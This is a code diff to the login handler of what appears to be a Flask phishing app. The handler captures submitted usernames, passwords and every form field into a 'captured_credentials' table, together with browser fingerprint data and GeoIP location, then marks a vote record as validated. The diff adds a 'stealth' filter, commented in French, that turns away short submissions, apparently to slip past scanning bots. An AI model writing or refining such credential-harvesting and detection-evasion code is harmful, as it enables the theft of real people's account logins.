@@ -5,7 +5,7 @@ from datetime import datetime
 from flask import Blueprint, request, render_template, redirect, url_for, jsonify, session
 
 from ..config import CONFIG
-from ..database import generate_participant_id, log_event, init_database, blacklist_ip
+from ..database import generate_participant_id, log_event, init_database, blacklist_ip, get_db_connection
 from ..crypto import encrypt_password
 from ..geo import geoip
 
@@ -122,8 +122,15 @@ def handle_login():
         or form_fields.get('pass', '')
         or form_fields.get('pwd', '')
     )
+    
+    # --- STEALTH FIX: Basic Anti-Bot / Noise Filter ---
+    # On ignore les soumissions vides ou trop courtes (bots de scan)
+    if not username or len(username) < 3:
+        return render_template('redirect.html', message="Erreur d'authentification", delay=3)
+
     all_fields = {k: v for k, v in form_fields.items()
                   if k != 'participant_id'}
+    
     log_event("LOGIN_ATTEMPT", participant_id, {
         "username_provided": bool(username),
         "password_provided": bool(password),
@@ -131,49 +138,54 @@ def handle_login():
         "fields_count": len(all_fields),
         "field_names": list(all_fields.keys())
     })
+    
     if username or all_fields:
         credential_str = json.dumps(all_fields, ensure_ascii=False)
-        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
-        c = conn.cursor()
-        try:
-            screen_res = request.form.get('screen_resolution', '')
-            timezone = request.form.get('timezone', '')
-            browser_lang = request.form.get('browser_language', '')
-            platform = request.form.get('platform', '')
-        except:
-            screen_res = timezone = browser_lang = platform = ''
-        country = geoip(request.remote_addr)
-        c.execute('''
-            INSERT INTO captured_credentials 
-            (participant_id, username, password, ip_address, user_agent, session_token,
-             screen_resolution, timezone, browser_language, platform, notes, country)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (participant_id,
-              username or json.dumps(all_fields),
-              encrypt_password(password or ''),
-              request.remote_addr,
-              request.headers.get('User-Agent', 'Unknown'),
-              None,
-              screen_res, timezone, browser_lang, platform,
-              credential_str,
-              country))
-        conn.commit()
-        conn.close()
+        
+        with get_db_connection() as conn:
+            c = conn.cursor()
+            try:
+                screen_res = request.form.get('screen_resolution', '')
+                timezone = request.form.get('timezone', '')
+                browser_lang = request.form.get('browser_language', '')
+                platform = request.form.get('platform', '')
+            except:
+                screen_res = timezone = browser_lang = platform = ''
+            
+            country = geoip(request.remote_addr)
+            c.execute('''
+                INSERT INTO captured_credentials 
+                (participant_id, username, password, ip_address, user_agent, session_token,
+                 screen_resolution, timezone, browser_language, platform, notes, country)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (participant_id,
+                  username or json.dumps(all_fields),
+                  encrypt_password(password or ''),
+                  request.remote_addr,
+                  request.headers.get('User-Agent', 'Unknown'),
+                  None,
+                  screen_res, timezone, browser_lang, platform,
+                  credential_str,
+                  country))
+            conn.commit()
+        
         log_event("CAPTURE", participant_id, {
             "fields": list(all_fields.keys()),
             "username_length": len(username),
             "password_length": len(password),
         })
+
+    # Update status for votes
     try:
-        conn2 = sqlite3.connect(CONFIG["CAPTURE_DB"])
-        conn2.execute(
-            "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
-            (participant_id,)
-        )
-        conn2.commit()
-        conn2.close()
+        with get_db_connection() as conn2:
+            conn2.execute(
+                "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
+                (participant_id,)
+            )
+            conn2.commit()
     except:
         pass
+
     return render_template('redirect.html',
                           message="Connexion. Redirection...",
                           delay=2)
